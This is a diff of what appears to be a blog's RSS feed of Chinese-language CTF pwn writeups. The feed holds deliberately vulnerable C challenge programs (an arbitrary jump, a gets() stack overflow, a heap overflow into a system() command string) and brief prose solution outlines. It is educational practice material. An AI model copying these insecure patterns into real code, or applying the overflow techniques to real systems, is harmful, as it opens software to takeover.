@@ -314,15 +384,8 @@ What is Format String Vulnerability（格式化字串漏洞）?
 </span></span><span class="line"><span class="cl">  <span class="nf">signal</span><span class="p">(</span><span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">segfault_handler</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">  <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">// _IONBF = Unbuffered
 </span></span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Address of main: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">main</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">val</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Enter the address to jump to, ex =&gt; 0x12345: &#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%lx&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">val</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Your input: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">foo</span><span class="p">)(</span><span class="kt">void</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">val</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">  <span class="nf">foo</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">call_functions</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><h2 id="解題">
 <a class="header-anchor" href="#%e8%a7%a3%e9%a1%8c"></a>
@@ -330,10 +393,9 @@ What is Format String Vulnerability（格式化字串漏洞）?
 </h2><h3 id="解題思路">
 <a class="header-anchor" href="#%e8%a7%a3%e9%a1%8c%e6%80%9d%e8%b7%af"></a>
 解題思路
-</h3><p>PIE保護機制會讓每次程式運行時位置不同,但每個函數間的相對位置offset不會改變,題目輸出main的真實位置,只要加上main與win的offset就能跳到那裡<br>
-PS : 因為是用scanf讀取所以用hex(main_addr).encode()</p>
+</h3><p>利用Format String Vulnerability（格式化字串漏洞）洩漏的位置,因為PIE的相對位置不會改變,計算與win function 的 offset,跳過去</p>
         
-        <hr><p>本文2026-07-03首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-07-03</p>]]>
+        <hr><p>本文2026-08-25首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-08-25</p>]]>
       </description>
       
         <category>Picoctf</category>
@@ -343,13 +405,13 @@ PS : 因為是用scanf讀取所以用hex(main_addr).encode()</p>
     
 
     <item>
-      <title>mathter writeup</title>
-      <link>http://localhost:1313/post/mathter/</link>
-      <pubDate>Mon, 08 Jun 2026 21:10:52 &#43;0800</pubDate>
+      <title>Input Injection 2</title>
+      <link>http://localhost:1313/post/input_injection_2/</link>
+      <pubDate>Thu, 20 Aug 2026 11:40:52 &#43;0800</pubDate>
       <author>ray784523@zhienw.com (Zhi Chen)</author>
-      <guid>http://localhost:1313/post/mathter/</guid>
+      <guid>http://localhost:1313/post/input_injection_2/</guid>
       <description>
-        <![CDATA[<h1>mathter writeup</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
+        <![CDATA[<h1>Input Injection 2</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
         
           <h2 id="原始碼">
 <a class="header-anchor" href="#%e5%8e%9f%e5%a7%8b%e7%a2%bc"></a>
@@ -358,370 +420,122 @@ PS : 因為是用scanf讀取所以用hex(main_addr).encode()</p>
 </span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">win1</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">check</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">check</span> <span class="o">==</span> <span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;/home/mathter/flag&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">fp</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">            <span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nf">fgets</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">flag</span><span class="p">),</span> <span class="n">fp</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">                <span class="kt">size_t</span> <span class="n">len</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">flag</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="n">len</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">flag</span><span class="p">[</span><span class="n">len</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;\n&#39;</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">                    <span class="n">flag</span><span class="p">[</span><span class="n">len</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">                    <span class="n">len</span><span class="o">--</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">                <span class="p">}</span>
-</span></span><span class="line"><span class="cl">                <span class="kt">size_t</span> <span class="n">mid</span> <span class="o">=</span> <span class="n">len</span> <span class="o">/</span> <span class="mi">2</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">mid</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">                    <span class="nf">putchar</span><span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
-</span></span><span class="line"><span class="cl">                <span class="p">}</span>
-</span></span><span class="line"><span class="cl">                <span class="nf">putchar</span><span class="p">(</span><span class="sc">&#39;\n&#39;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">            <span class="p">}</span>
-</span></span><span class="line"><span class="cl">            <span class="nf">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Failed to open flag file.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="p">}</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Sorry, wrong argument. Try again!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">char</span><span class="o">*</span> <span class="n">username</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mi">28</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">char</span><span class="o">*</span> <span class="n">shell</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mi">28</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;username at %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">username</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;shell at %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">shell</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="nf">strcpy</span><span class="p">(</span><span class="n">shell</span><span class="p">,</span> <span class="s">&#34;/bin/pwd&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Enter username: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="n">username</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Hello, %s. Your shell is %s.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">shell</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">system</span><span class="p">(</span><span class="n">shell</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">win2</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">check</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">check</span> <span class="o">==</span> <span class="mh">0xcafebabe</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;/home/mathter/flag&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">fp</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">            <span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nf">fgets</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">flag</span><span class="p">),</span> <span class="n">fp</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">                <span class="kt">size_t</span> <span class="n">len</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">flag</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="n">len</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">flag</span><span class="p">[</span><span class="n">len</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;\n&#39;</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">                    <span class="n">flag</span><span class="p">[</span><span class="n">len</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span> 
-</span></span><span class="line"><span class="cl">                    <span class="n">len</span><span class="o">--</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">                <span class="p">}</span>
-</span></span><span class="line"><span class="cl">                <span class="kt">size_t</span> <span class="n">mid</span> <span class="o">=</span> <span class="n">len</span> <span class="o">/</span> <span class="mi">2</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="n">mid</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">                    <span class="nf">putchar</span><span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
-</span></span><span class="line"><span class="cl">                <span class="p">}</span>
-</span></span><span class="line"><span class="cl">                <span class="nf">putchar</span><span class="p">(</span><span class="sc">&#39;\n&#39;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">            <span class="p">}</span>
-</span></span><span class="line"><span class="cl">            <span class="nf">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Failed to open flag file.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="p">}</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Sorry, wrong argument. Try again!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">goodbye</span><span class="p">()</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">response</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Are you sure you want to leave? [Y/n]</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">gets</span><span class="p">(</span><span class="n">response</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">response</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;y&#39;</span> <span class="o">||</span> <span class="n">response</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;Y&#39;</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Goodbye!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">calculator</span><span class="p">()</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">input</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span> 
-</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">result</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">op</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Enter an operation and two numbers (e.g., 1 + 1) : &#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="nf">fgets</span><span class="p">(</span><span class="n">input</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">input</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">input</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;q&#39;</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Exiting calculator...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nf">sscanf</span><span class="p">(</span><span class="n">input</span><span class="p">,</span> <span class="s">&#34;%d %c %d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">x</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">op</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">y</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">            <span class="k">switch</span> <span class="p">(</span><span class="n">op</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">                <span class="k">case</span> <span class="sc">&#39;+&#39;</span><span class="o">:</span>
-</span></span><span class="line"><span class="cl">                    <span class="n">result</span> <span class="o">=</span> <span class="n">x</span> <span class="o">+</span> <span class="n">y</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">                    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%d + %d = %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">result</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">                    <span class="k">break</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">                <span class="k">case</span> <span class="sc">&#39;-&#39;</span><span class="o">:</span>
-</span></span><span class="line"><span class="cl">                    <span class="n">result</span> <span class="o">=</span> <span class="n">x</span> <span class="o">-</span> <span class="n">y</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">                    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%d - %d = %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">result</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">                    <span class="k">break</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">                <span class="k">case</span> <span class="sc">&#39;*&#39;</span><span class="o">:</span>
-</span></span><span class="line"><span class="cl">                    <span class="n">result</span> <span class="o">=</span> <span class="n">x</span> <span class="o">*</span> <span class="n">y</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">                    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%d * %d = %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">result</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">                    <span class="k">break</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">                <span class="k">case</span> <span class="sc">&#39;/&#39;</span><span class="o">:</span>
-</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="p">(</span><span class="n">y</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">                        <span class="n">result</span> <span class="o">=</span> <span class="n">x</span> <span class="o">/</span> <span class="n">y</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">                        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%d / %d = %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">result</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">                    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">                        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Error: Division by zero!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">                    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">                    <span class="k">break</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">                <span class="k">default</span><span class="o">:</span>
-</span></span><span class="line"><span class="cl">                    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Invalid operation!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">            <span class="p">}</span>
-</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Invalid input format. Please use the format: 1 + 1</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="p">}</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34; __        __   _                            _          __  __       _   _     _            </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34; </span><span class="se">\\</span><span class="s"> </span><span class="se">\\</span><span class="s">      / /__| | ___ ___  _ __ ___   ___  | |_ ___   |  </span><span class="se">\\</span><span class="s">/  | __ _| |_| |__ | |_ ___ _ __ </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;  </span><span class="se">\\</span><span class="s"> </span><span class="se">\\</span><span class="s"> /</span><span class="se">\\</span><span class="s"> / / _ </span><span class="se">\\</span><span class="s"> |/ __/ _ </span><span class="se">\\</span><span class="s">| &#39;_ ` _ </span><span class="se">\\</span><span class="s"> / _ </span><span class="se">\\</span><span class="s"> | __/ _ </span><span class="se">\\</span><span class="s">  | |</span><span class="se">\\</span><span class="s">/| |/ _` | __| &#39;_ </span><span class="se">\\</span><span class="s">| __/ _ </span><span class="se">\\</span><span class="s"> &#39;__|</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;   </span><span class="se">\\</span><span class="s"> V  V /  __/ | (_| (_) | | | | | |  __/ | || (_) | | |  | | (_| | |_| | | | ||  __/ |   </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;    </span><span class="se">\\</span><span class="s">_/</span><span class="se">\\</span><span class="s">_/ </span><span class="se">\\</span><span class="s">___|_|</span><span class="se">\\</span><span class="s">___</span><span class="se">\\</span><span class="s">___/|_| |_| |_|</span><span class="se">\\</span><span class="s">___|  </span><span class="se">\\</span><span class="s">__</span><span class="se">\\</span><span class="s">___/  |_|  |_|</span><span class="se">\\</span><span class="s">__,_|</span><span class="se">\\</span><span class="s">__|_| |_|</span><span class="se">\\</span><span class="s">__</span><span class="se">\\</span><span class="s">___|_|</span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    
-</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="nf">calculator</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nf">goodbye</span><span class="p">()){</span>
-</span></span><span class="line"><span class="cl">	    <span class="k">break</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">	<span class="p">}</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="c1">//gcc -static -o mathter -no-pie -fno-stack-protector -z now -z relro mathter.c
-</span></span></span></code></pre></div><h2 id="解題">
+</span></span></code></pre></div><h2 id="解題">
 <a class="header-anchor" href="#%e8%a7%a3%e9%a1%8c"></a>
 解題
 </h2><h3 id="解題思路">
 <a class="header-anchor" href="#%e8%a7%a3%e9%a1%8c%e6%80%9d%e8%b7%af"></a>
 解題思路
-</h3><p>在goodbye function有用get函數可以進行overflow,並且利用pop rdi設定參數,分別跳到win1、win2 funtion取得2段flag<br>
-PS : 這題要注意的是在取overflow起點時會碰到rax-4,要用該位置+4設為起點<br>
-PS : 要覆蓋的位置不要找成main函數的return</p>
+</h3><p>利用heap overflow覆蓋執行字串,取得shell</p>
         
-        <hr><p>本文2026-06-08首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-06-08</p>]]>
+        <hr><p>本文2026-08-20首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-08-20</p>]]>
       </description>
       
-        <category>SCIST pwn</category>
+        <category>Picoctf</category>
       
     </item>
     
     
 
     <item>
-      <title>got writeup</title>
-      <link>http://localhost:1313/post/got/</link>
-      <pubDate>Sat, 06 Jun 2026 04:19:52 &#43;0800</pubDate>
+      <title>Silent Stream writeup</title>
+      <link>http://localhost:1313/post/silent_stream/</link>
+      <pubDate>Tue, 18 Aug 2026 22:31:52 &#43;0800</pubDate>
       <author>ray784523@zhienw.com (Zhi Chen)</author>
-      <guid>http://localhost:1313/post/got/</guid>
+      <guid>http://localhost:1313/post/silent_stream/</guid>
       <description>
-        <![CDATA[<h1>got writeup</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
+        <![CDATA[<h1>Silent Stream writeup</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
+        
+          <h2 id="將題目的pcap檔的data提取出來">
